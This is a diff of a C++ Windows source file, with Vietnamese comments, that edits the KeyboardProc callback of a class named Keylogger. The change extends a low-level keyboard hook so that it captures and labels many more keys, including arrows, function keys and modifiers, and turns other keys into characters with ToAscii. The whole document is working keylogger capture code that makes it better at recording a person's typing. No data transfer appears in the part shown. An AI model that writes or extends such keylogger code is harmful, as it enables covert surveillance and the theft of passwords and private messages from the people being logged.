@@ -26,22 +26,58 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
         KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
         int key = kbdStruct->vkCode; // Lấy mã phím ảo
 
-        // Xử lý các phím đặc biệt để dễ đọc
-        if (key == VK_BACK) append("[BACK]");
-        else if (key == VK_RETURN) append("\n");
-        else if (key == VK_SPACE) append(" ");
+        if (key == VK_RETURN) append("[RETURN]");
         else if (key == VK_TAB) append("[TAB]");
-        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {}
-        else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) append("[CTRL]");
+        else if (key == VK_SPACE) append(" ");
+        else if (key == VK_BACK) append("[DELETE]");
+        else if (key == VK_DELETE) append("[DEL]");
         else if (key == VK_ESCAPE) append("[ESC]");
-        // Xử lý số và chữ cái
+        else if (key == VK_LWIN || key == VK_RWIN) append("[CMD]");
+        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) append("[SHIFT]");
+        else if (key == VK_CAPITAL) append("[CAPS]");
+        else if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) append("[OPT]");
+        else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) append("[CTRL]");
+        else if (key == VK_LEFT) append("[LEFT]");
+        else if (key == VK_RIGHT) append("[RIGHT]");
+        else if (key == VK_UP) append("[UP]");
+        else if (key == VK_DOWN) append("[DOWN]");
+        else if (key == VK_HOME) append("[HOME]");
+        else if (key == VK_END) append("[END]");
+        else if (key == VK_PRIOR) append("[PGUP]");
+        else if (key == VK_NEXT) append("[PGDN]");
+        else if (key == VK_INSERT) append("[INS]");
+        else if (key == VK_F1) append("[F1]");
+        else if (key == VK_F2) append("[F2]");
+        else if (key == VK_F3) append("[F3]");
+        else if (key == VK_F4) append("[F4]");
+        else if (key == VK_F5) append("[F5]");
+        else if (key == VK_F6) append("[F6]");
+        else if (key == VK_F7) append("[F7]");
+        else if (key == VK_F8) append("[F8]");
+        else if (key == VK_F9) append("[F9]");
+        else if (key == VK_F10) append("[F10]");
+        else if (key == VK_F11) append("[F11]");
+        else if (key == VK_F12) append("[F12]");
+        else if (key == VK_F13) append("[F13]");
+        else if (key == VK_F14) append("[F14]");
+        else if (key == VK_F15) append("[F15]");
+        else if (key == VK_NUMLOCK) append("[NUMLOCK]");
         else if ((key >= '0' && key <= '9') || (key >= 'A' && key <= 'Z')) {
-             // Chuyển mã ASCII sang ký tự
              append(std::string(1, (char)key));
         }
         else {
-             // Các phím lạ thì ghi mã số
-             append("[" + std::to_string(key) + "]");
+             BYTE keyState[256];
+             WORD translated[2];
+             if (GetKeyboardState(keyState)) {
+                 int result = ToAscii(key, 0, keyState, translated, 0);
+                 if (result == 1 && translated[0] >= 32 && translated[0] <= 126) {
+                     append(std::string(1, (char)translated[0]));
+                 } else {
+                     append("[" + std::to_string(key) + "]");
+                 }
+             } else {
+                 append("[" + std::to_string(key) + "]");
+             }
         }
     }
     // Forward event to next hook (required for keyboard to work)
